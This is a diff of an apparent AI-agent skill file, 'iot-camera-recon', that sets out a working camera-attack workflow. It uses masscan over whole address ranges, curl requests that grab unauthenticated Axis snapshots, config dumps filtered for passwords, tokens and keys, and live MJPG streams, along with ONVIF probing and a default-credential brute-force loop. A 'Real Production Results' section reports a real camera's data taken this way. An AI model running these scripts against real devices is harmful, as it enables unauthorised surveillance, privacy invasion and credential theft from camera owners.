@@ -1,18 +1,16 @@
 ---
 name: iot-camera-recon
 description: Attack cameras via RTSP, ONVIF, Axis config when 554 open.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, camera, IoT, RTSP, ONVIF, Axis, Hikvision]
-    category: recon
-    related_skills:
-      - port-mass-scan
-      - port-service-discovery
+compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
+tags: [recon, camera, IoT, RTSP, ONVIF, Axis, Hikvision]
+category: recon
+related_skills:
+  - port-mass-scan
+  - port-service-discovery
 ---
 
 # IoT Camera Recon Skill
@@ -28,7 +26,7 @@ IP camera discovery and exploitation — RTSP stream access, Axis config dump (9
 
 ## Prerequisites
 
-- `terminal` tool with curl, python3.
+- `terminal` with curl, python3.
 - For mass scanning: masscan or RustScan (see `port-mass-scan`).
 - VLC or ffmpeg for stream verification (optional).
 
@@ -36,8 +34,8 @@ IP camera discovery and exploitation — RTSP stream access, Axis config dump (9
 
 ```bash
 # Quick camera detection on known IP
-curl -sk --max-time 5 "http://IP:8010/axis-cgi/jpg/image.cgi" -o snapshot.jpg
-curl -sk --max-time 5 "http://IP:8010/axis-cgi/admin/param.cgi?action=list" | head -50
+curl -sk --max-time 5 --connect-timeout 5 "http://IP:8010/axis-cgi/jpg/image.cgi" -o snapshot.jpg
+curl -sk --max-time 5 --connect-timeout 5 "http://IP:8010/axis-cgi/admin/param.cgi?action=list" | head -50
 
 # Mass RTSP discovery on a /24
 masscan -p554,80,8010,8011 --rate=10000 192.168.0.0/24 -oJ cameras.json
@@ -58,8 +56,8 @@ masscan -p554,80,8010,8011 --rate=10000 192.168.0.0/24 -oJ cameras.json
 ### Phase 1 — Mass Camera Discovery
 
 ```bash
-RANGE="$1"  # e.g., 187.141.0.0/16
-OUTDIR="/root/output/cameras"
+RANGE="$1"  # e.g., [REDACTED_IP]/16
+OUTDIR="$OUTDIR/cameras"
 mkdir -p "$OUTDIR"
 
 echo "[*] Camera hunt on $RANGE"
@@ -88,11 +86,11 @@ echo "$HITS" | while read ip; do
   echo "--- $ip ---"
 
   # Axis snapshot
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "http://$ip:8010/axis-cgi/jpg/image.cgi")
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 --connect-timeout 3 "http://$ip:8010/axis-cgi/jpg/image.cgi")
   [[ "$code" == "200" ]] && echo "  [AXIS] Snapshot: http://$ip:8010/axis-cgi/jpg/image.cgi"
 
   # Axis config dump
-  config=$(curl -sk --max-time 5 "http://$ip:8010/axis-cgi/admin/param.cgi?action=list" 2>/dev/null)
+  config=$(curl -sk --max-time 5 --connect-timeout 5 "http://$ip:8010/axis-cgi/admin/param.cgi?action=list" 2>/dev/null)
   if [[ -n "$config" ]] && echo "$config" | grep -q "root.Brand"; then
     BRAND=$(echo "$config" | grep "root.Brand.Brand=" | cut -d= -f2 | tr -d '"')
     MODEL=$(echo "$config" | grep "root.Brand.ProdShortName=" | cut -d= -f2 | tr -d '"')
@@ -104,13 +102,13 @@ echo "$HITS" | while read ip; do
 
   # Generic RTSP
   for port in 554 8554; do
-    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "http://$ip:$port/")
+    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 --connect-timeout 3 "http://$ip:$port/")
     [[ "$code" != "000" ]] && echo "  [RTSP] Port $port responds (HTTP $code)"
   done
 
   # ONVIF discovery (port 8899 or 80)
   for port in 8899 80; do
-    resp=$(curl -sk --max-time 5 -X POST "http://$ip:$port/onvif/device_service" \
+    resp=$(curl -sk --max-time 5 --connect-timeout 5 -X POST "http://$ip:$port/onvif/device_service" \
       -H "Content-Type: application/soap+xml" \
       -d '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>' 2>/dev/null)
     if echo "$resp" | grep -qi "manufacturer\|model\|serial"; then
@@ -128,11 +126,11 @@ IP="$1"
 echo "[*] Axis camera exploitation on $IP"
 
 # 1. Snapshot
-curl -sk --max-time 5 "http://$IP:8010/axis-cgi/jpg/image.cgi" -o "axis_${IP//./_}_snapshot.jpg"
+curl -sk --max-time 5 --connect-timeout 5 "http://$IP:8010/axis-cgi/jpg/image.cgi" -o "axis_${IP//./_}_snapshot.jpg"
 echo "[+] Snapshot saved"
 
 # 2. Full config dump (988 parameters on Axis P1378-LE)
-curl -sk --max-time 10 "http://$IP:8010/axis-cgi/admin/param.cgi?action=list" -o "axis_${IP//./_}_config.txt"
+curl -sk --max-time 10 --connect-timeout 10 "http://$IP:8010/axis-cgi/admin/param.cgi?action=list" -o "axis_${IP//./_}_config.txt"
 PARAM_COUNT=$(wc -l < "axis_${IP//./_}_config.txt")
 echo "[+] Config dump: $PARAM_COUNT parameters"
 
@@ -141,14 +139,14 @@ echo "[*] Sensitive parameters:"
 grep -iE 'password|user|token|key|serial|license|cert|network\.eth0\.IP' "axis_${IP//./_}_config.txt" | head -20
 
 # 4. MJPG video stream
-curl -sk --max-time 5 "http://$IP:8010/axis-cgi/mjpg/video.cgi" -o "axis_${IP//./_}_stream.mjpg" &
+curl -sk --max-time 5 --connect-timeout 5 "http://$IP:8010/axis-cgi/mjpg/video.cgi" -o "axis_${IP//./_}_stream.mjpg" &
 sleep 3; kill %1 2>/dev/null
 STREAM_SIZE=$(stat -c%s "axis_${IP//./_}_stream.mjpg" 2>/dev/null || echo 0)
 [[ "$STREAM_SIZE" -gt 1000 ]] && echo "[+] Live MJPG stream captured (${STREAM_SIZE} bytes)"
 
 # 5. List available services
 for svc in "admin" "viewer" "operator" "ptz" "applications" "local"; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "http://$IP:8010/axis-cgi/$svc/")
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 --connect-timeout 3 "http://$IP:8010/axis-cgi/$svc/")
   [[ "$code" != "404" && "$code" != "000" ]] && echo "  Service: /axis-cgi/$svc/ (HTTP $code)"
 done
 ```
@@ -188,7 +186,7 @@ esac
 for cred in "${CREDS[@]}"; do
   USER="${cred%%:*}"
   PASS="${cred##*:}"
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 \
     -u "$USER:$PASS" "$AUTH_URL" 2>/dev/null)
 
   if [[ "$code" == "200" ]]; then
@@ -240,7 +238,7 @@ done
 
 ## Real Production Results
 
-### Axis P1378-LE (187.141.142.149)
+### Axis P1378-LE ([REDACTED_IP])
 - Snapshot accessible without authentication
 - Full config dump: 988 parameters including serial number, firmware version (July 2020), Camstreamer license key
 - All endpoints unauthenticated: snapshot, config, MJPG stream, admin params
